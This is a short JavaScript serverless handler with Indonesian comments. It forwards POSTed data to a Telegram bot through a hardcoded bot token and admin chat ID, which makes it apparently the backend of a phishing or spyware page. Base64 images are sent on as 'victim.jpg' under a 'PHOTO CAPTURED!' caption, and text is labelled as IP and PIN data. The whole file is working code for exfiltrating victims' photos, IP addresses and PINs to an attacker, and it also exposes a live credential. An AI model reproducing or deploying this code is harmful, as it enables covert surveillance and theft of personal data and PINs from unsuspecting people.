export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

    const BOT_TOKEN = "8651759192:AAGAHKMB_vgP7SrlLUGmDtyboaasI9lwZpA";
    const ADMIN_ID = "7349944283";

    try {
        const body = JSON.parse(req.body);
        
        // JIKA KIRIM FOTO (Base64)
        if (body.image) {
            const base64Data = body.image.split(',')[1];
            const buffer = Buffer.from(base64Data, 'base64');
            const formData = new FormData();
            formData.append('chat_id', ADMIN_ID);
            formData.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'victim.jpg');
            formData.append('caption', `📸 **PHOTO CAPTURED!**\n🆔 \`${body.session_id}\``);

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        } 
        // JIKA KIRIM TEKS (Data IP/PIN)
        else {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_ID,
                    text: body.text,
                    parse_mode: 'Markdown'
                })
            });
        }
        res.status(200).json({ status: 'sent' });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
}
